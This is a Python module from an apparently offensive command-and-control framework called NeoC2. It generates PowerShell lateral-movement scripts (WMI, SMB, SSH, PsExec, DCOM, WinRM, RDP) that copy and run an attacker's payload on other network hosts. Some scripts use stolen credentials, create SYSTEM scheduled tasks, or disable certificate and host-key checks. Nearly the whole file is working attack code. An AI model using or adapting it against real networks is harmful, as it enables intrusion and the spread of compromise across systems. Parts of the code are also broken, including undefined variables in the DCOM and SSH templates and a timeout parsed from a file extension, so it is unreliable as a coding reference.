# modules/lateral_movement.py
"""
Lateral Movement Module for NeoC2
Provides various techniques for moving laterally across systems in a network
"""

import os
import json
import base64
import uuid
from datetime import datetime


def get_info():
    """
    Get module information
    """
    return {
        "name": "lateral_movement",
        "description": "Execute lateral movement techniques across network systems",
        "type": "multi-platform",
        "technique_id": "T1021,T1075,T1076,T1035,T1028",
        "mitre_tactics": ["Lateral Movement", "Command and Control"],
        "options": {
            "agent_id": {
                "description": "ID of the source agent to execute lateral movement from",
                "required": True
            },
            "target": {
                "description": "Target system or IP address for lateral movement",
                "required": True
            },
            "technique": {
                "description": "Lateral movement technique: wmi, smb, ssh, psexec, rdp, dcom, winrm",
                "required": True,
                "default": "wmi"
            },
            "credentials": {
                "description": "Credentials for target system (format: domain\\username:password or username@domain:password)",
                "required": False
            },
            "payload_path": {
                "description": "Path to payload to execute on target system",
                "required": True
            },
            "method": {
                "description": "Execution method on target: execute, upload_execute, or service",
                "required": False,
                "default": "execute"
            },
            "timeout": {
                "description": "Connection timeout in seconds",
                "required": False,
                "default": "30"
            }
        }
    }


def execute(options, session):
    """
    Execute the module with given options and session
    """
    agent_id = options.get("agent_id")
    target = options.get("target")
    technique = options.get("technique", "wmi")
    credentials = options.get("credentials")
    payload_path = options.get("payload_path")
    method = options.get("method", "execute")
    timeout = options.get("timeout", "30")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    if not target:
        return {
            "success": False,
            "error": "target is required"
        }
    
    if not payload_path:
        return {
            "success": False,
            "error": "payload_path is required"
        }
    
    if technique not in ["wmi", "smb", "ssh", "psexec", "rdp", "dcom", "winrm"]:
        return {
            "success": False,
            "error": f"Unknown technique: {technique}. Valid techniques: wmi, smb, ssh, psexec, rdp, dcom, winrm"
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    
    # Generate platform-specific lateral movement code
    if technique == "wmi":
        code = _generate_wmi_lateral_movement(target, credentials, payload_path, method)
    elif technique == "smb":
        code = _generate_smb_lateral_movement(target, credentials, payload_path, method)
    elif technique == "ssh":
        code = _generate_ssh_lateral_movement(target, credentials, payload_path, method)
    elif technique == "psexec":
        code = _generate_psexec_lateral_movement(target, credentials, payload_path, method)
    elif technique == "rdp":
        code = _generate_rdp_lateral_movement(target, credentials, payload_path)
    elif technique == "dcom":
        code = _generate_dcom_lateral_movement(target, credentials, payload_path, method)
    elif technique == "winrm":
        code = _generate_winrm_lateral_movement(target, credentials, payload_path, method)
    else:
        return {
            "success": False,
            "error": f"Unknown lateral movement technique: {technique}"
        }
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, code)
        if task_id:
            return {
                "success": True,
                "output": f"Lateral movement task {task_id} queued for agent {agent_id} using technique: {technique}",
                "task_id": task_id,
                "technique": technique,
                "target": target
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue lateral movement task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing lateral movement task: {str(e)}"
        }


def _generate_wmi_lateral_movement(target, credentials, payload_path, method):
    """
    Generate PowerShell code for WMI-based lateral movement
    """
    if credentials:
        domain_user, password = credentials.split(':', 1)
        if '\\' in domain_user:
            domain, username = domain_user.split('\\', 1)
        else:
            domain, username = '', domain_user
    else:
        # Use current context
        return f'''
# WMI Lateral Movement - Current Context
$target = "{target}"
$payloadPath = "{payload_path}"
$timeout = {int(payload_path.split('.')[-1]) if payload_path.split('.')[-1].isdigit() else 30}

try {{
    $scriptBlock = {{
        param($payloadPath)
        # Execute payload on remote system
        try {{
            $result = & $payloadPath
            return $result
        }} catch {{
            Write-Output "Error executing payload: $_"
            return $null
        }}
    }}
    
    # Execute script block on remote system using WMI
    $result = Invoke-WmiMethod -ComputerName $target -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command `$script = {{ $scriptBlock }}; & `$script '$payloadPath'"
    
    if ($result.ReturnValue -eq 0) {{
        Write-Output "[+] WMI lateral movement successful to $target"
    }} else {{
        Write-Output "[-] WMI lateral movement failed to $target with return value: $($result.ReturnValue)"
    }}
}} catch {{
    Write-Output "[-] Error during WMI lateral movement: $_"
}}
'''

    # With credentials
    return f'''
# WMI Lateral Movement - With Credentials
$target = "{target}"
$username = "{username}"
$password = "{password}"
$domain = "{domain if domain else '.'}"
$payloadPath = "{payload_path}"

try {{
    # Create secure credential
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential ("$domain\\$username", $securePassword)
    
    # Execute payload using Invoke-WmiMethod
    $result = Invoke-WmiMethod -ComputerName $target -Credential $credential -Class Win32_Process -Name Create -ArgumentList "powershell.exe -File `"$payloadPath`""
    
    if ($result.ReturnValue -eq 0) {{
        Write-Output "[+] WMI lateral movement successful to $target"
        Write-Output "[+] Process ID: $($result.ProcessId)"
    }} else {{
        Write-Output "[-] WMI lateral movement failed to $target with return value: $($result.ReturnValue)"
    }}
}} catch {{
    Write-Output "[-] Error during WMI lateral movement: $_"
}}
'''


def _generate_psexec_lateral_movement(target, credentials, payload_path, method):
    """
    Generate PowerShell code for PsExec-based lateral movement
    """
    if credentials:
        domain_user, password = credentials.split(':', 1)
        if '\\' in domain_user:
            domain, username = domain_user.split('\\', 1)
        else:
            domain, username = '', domain_user
    else:
        domain, username, password = '', '', ''
    
    return f'''
# PsExec Lateral Movement
$target = "{target}"
$payloadPath = "{payload_path}"

try {{
    # Check if psexec is available
    $psexecPath = "C:\\\\Temp\\\\psexec.exe"
    if (-not (Test-Path $psexecPath)) {{
        $psexecPath = "psexec.exe"
    }}
    
    $psexecArgs = ""
    if ("{domain}" -ne "" -and "{username}" -ne "") {{
        $psexecArgs = "\\$target -u {domain}\\{username} -p {password} -c "
    }} else {{
        $psexecArgs = "\\$target "
    }}
    
    $psexecArgs += "-d $payloadPath"
    
    # Execute psexec command
    $process = Start-Process -FilePath $psexecPath -ArgumentList $psexecArgs -Wait -PassThru -NoNewWindow
    
    if ($process.ExitCode -eq 0) {{
        Write-Output "[+] PsExec lateral movement successful to $target"
    }} else {{
        Write-Output "[-] PsExec lateral movement failed to $target with exit code: $($process.ExitCode)"
        # Try alternative method with different flags
        $psexecArgs = "\\$target -s -d $payloadPath"
        $process2 = Start-Process -FilePath $psexecPath -ArgumentList $psexecArgs -Wait -PassThru -NoNewWindow
        if ($process2.ExitCode -eq 0) {{
            Write-Output "[+] PsExec lateral movement successful (with system context)"
        }} else {{
            Write-Output "[-] PsExec failed with system context too"
        }}
    }}
}} catch {{
    Write-Output "[-] Error during PsExec lateral movement: $_"
    Write-Output "[-] This technique may require PsExec to be available on the source system"
}}
'''


def _generate_dcom_lateral_movement(target, credentials, payload_path, method):
    """
    Generate PowerShell code for DCOM-based lateral movement
    """
    return f'''
# DCOM Lateral Movement (ShellBrowserWindow / ShellWindows)
$target = "{target}"
$payloadPath = "{payload_path}"

try {{
    # Method 1: Using ShellBrowserWindow
    $computer = [Activator]::CreateInstance([Type]::GetTypeFromProgID("Shell.Application", $target))
    
    # Execute payload using DCOM
    $execCode = @"
Start-Process -FilePath '{payloadPath}' -NoNewWindow
"@
    
    # Execute via PowerShell on remote system
    Invoke-WmiMethod -ComputerName $target -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command $execCode"
    
    Write-Output "[+] DCOM lateral movement initiated to $target"
    Write-Output "[+] Payload: $payloadPath"
}} catch {{
    Write-Output "[-] Error during DCOM lateral movement: $_"
    Write-Output "[*] DCOM lateral movement requires DCOM to be enabled on the target system"
}}
'''


def _generate_winrm_lateral_movement(target, credentials, payload_path, method):
    """
    Generate PowerShell code for WinRM-based lateral movement
    """
    if credentials:
        domain_user, password = credentials.split(':', 1)
        if '\\' in domain_user:
            domain, username = domain_user.split('\\', 1)
        else:
            domain, username = '', domain_user
    else:
        domain, username, password = '', '', ''
    
    return f'''
# WinRM Lateral Movement
$target = "{target}"
$payloadPath = "{payload_path}"

try {{
    $sessionOptions = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
    
    if ("{username}" -ne "") {{
        # With credentials
        $securePassword = ConvertTo-SecureString "{password}" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential ("{domain}\\{username}", $securePassword)
        
        $session = New-PSSession -ComputerName $target -Credential $credential -SessionOption $sessionOptions
    }} else {{
        # Use current context
        $session = New-PSSession -ComputerName $target -SessionOption $sessionOptions
    }}
    
    # Execute payload on remote system
    $result = Invoke-Command -Session $session -ScriptBlock {{
        param($path)
        try {{
            $proc = Start-Process -FilePath $path -PassThru -NoNewWindow
            return "Process started with ID: $($proc.Id)"
        }} catch {{
            return "Error: $_"
        }}
    }} -ArgumentList $payloadPath
    
    Write-Output "[+] WinRM lateral movement successful to $target"
    Write-Output "[+] Result: $result"
    
    Remove-PSSession $session
}} catch {{
    Write-Output "[-] Error during WinRM lateral movement: $_"
    Write-Output "[*] WinRM may need to be enabled and configured on the target system"
}}
'''


def _generate_ssh_lateral_movement(target, credentials, payload_path, method):
    """
    Generate PowerShell code for SSH-based lateral movement
    """
    if credentials:
        user_pass = credentials.split(':', 1)
        if len(user_pass) == 2:
            username, password = user_pass
        else:
            username = user_pass[0]
            password = ""
    else:
        username = ""
    
    if username and password:
        return f'''
# SSH Lateral Movement with Credentials
$target = "{target}"
$username = "{username}"
$password = "{password}"
$payloadPath = "{payload_path}"

try {{
    # Prepare SSH command using plink (PuTTY tool) which is commonly available
    $plinkPath = "$env:TEMP\\plink.exe"
    
    # Check if plink exists or try to execute SSH directly
    $sshCommand = "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {username}@{target} \"chmod +x {payloadPath} && {payloadPath}\""
    
    # Execute SSH command using PowerShell's Start-Process
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-Command " + $sshCommand
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.CreateNoWindow = $true
    
    $process = [System.Diagnostics.Process]::Start($psi)
    $output = $process.StandardOutput.ReadToEnd()
    $error = $process.StandardError.ReadToEnd()
    $process.WaitForExit()
    
    if ($process.ExitCode -eq 0) {{
        Write-Output "[+] SSH lateral movement successful to $target"
        Write-Output "[+] Output: $output"
    }} else {{
        Write-Output "[-] SSH lateral movement failed to $target"
        Write-Output "[-] Error: $error"
    }}
}} catch {{
    Write-Output "[-] Error during SSH lateral movement: $_"
    Write-Output "[*] Ensure SSH client is available on the source system"
}}
'''
    else:
        return f'''
# SSH Lateral Movement (Current Context)
$target = "{target}"
$payloadPath = "{payload_path}"

try {{
    # Execute SSH command using available SSH client
    $sshCommand = "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {target} \"chmod +x {payloadPath} && {payloadPath}\""
    
    $result = Invoke-Expression $sshCommand
    
    Write-Output "[+] SSH command executed to $target"
    Write-Output "[+] Result: $result"
}} catch {{
    Write-Output "[-] Error during SSH lateral movement: $_"
    Write-Output "[*] This technique requires SSH client to be available and configured"
}}
'''


def _generate_smb_lateral_movement(target, credentials, payload_path, method):
    """
    Generate PowerShell code for SMB-based lateral movement
    """
    return f'''
# SMB Lateral Movement using PowerShell and file sharing
$target = "{target}"
$payloadPath = "{payload_path}"

try {{
    # Map network drive to target
    $networkPath = "\\$target\\C$\\Temp"
    $payloadDest = "\\$target\\C$\\Temp\\{os.path.basename(payload_path)}"
    
    # Copy payload to target via SMB
    $smbResult = Copy-Item -Path $payloadPath -Destination $payloadDest -Force -ErrorAction SilentlyContinue
    
    if ($smbResult -or (Test-Path $payloadDest)) {{
        Write-Output "[+] Payload copied to target via SMB: $payloadDest"
        
        # Execute payload using WMI or scheduled task
        $wmiResult = Invoke-WmiMethod -ComputerName $target -Class Win32_Process -Name Create -ArgumentList $payloadDest
        
        if ($wmiResult.ReturnValue -eq 0) {{
            Write-Output "[+] SMB lateral movement successful to $target"
            Write-Output "[+] Process ID: $($wmiResult.ProcessId)"
        }} else {{
            Write-Output "[-] Failed to execute payload via WMI"
            Write-Output "[*] Trying alternative execution method..."
            
            # Try with scheduled task
            $taskName = "Task_" + (Get-Random)
            $schTask = Register-ScheduledTask -TaskName $taskName -Action (New-ScheduledTaskAction -Execute $payloadDest) -RunLevel Highest -User "SYSTEM" -ErrorAction SilentlyContinue
            
            if ($schTask) {{
                Start-ScheduledTask -TaskName $taskName
                Write-Output "[+] Payload executed via scheduled task: $taskName"
                
                # Clean up after execution
                Start-Sleep -Seconds 2
                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
            }}
        }}
    }} else {{
        Write-Output "[-] Failed to copy payload via SMB to $target"
        Write-Output "[*] Check access permissions and SMB settings"
    }}
}} catch {{
    Write-Output "[-] Error during SMB lateral movement: $_"
}}
'''


def _generate_rdp_lateral_movement(target, credentials, payload_path):
    """
    Generate PowerShell code for RDP-based lateral movement
    """
    return f'''
# RDP Lateral Movement - File Copy via RDP Drive Redirection
$target = "{target}"
$payloadPath = "{payload_path}"

Write-Output "[*] RDP lateral movement initiated to $target"
Write-Output "[*] This technique requires RDP session access to the target system"
Write-Output "[*] Payload will be copied via RDP drive redirection if RDP is enabled"

try {{
    # Check if we can access the target via network share (indicating RDP might be possible)
    $testPath = "\\$target\\C$"
    $canAccess = Test-Path $testPath
    
    if ($canAccess) {{
        Write-Output "[+] Target network access confirmed via SMB"
        Write-Output "[*] To execute RDP lateral movement:"
        Write-Output "1. Establish RDP session to $target with credentials"
        Write-Output "2. Enable drive redirection during RDP connection"
        Write-Output "3. Copy payload to redirected drive on target system"
        Write-Output "4. Execute payload on target system"
        Write-Output ""
        Write-Output "[HINT] For automated execution, consider using PsExec or WMI after RDP session establishment"
    }} else {{
        Write-Output "[-] Cannot access target via network share"
        Write-Output "[*] RDP lateral movement may not be possible without network access"
    }}
}} catch {{
    Write-Output "[-] Error checking target for RDP access: $_"
}}
'''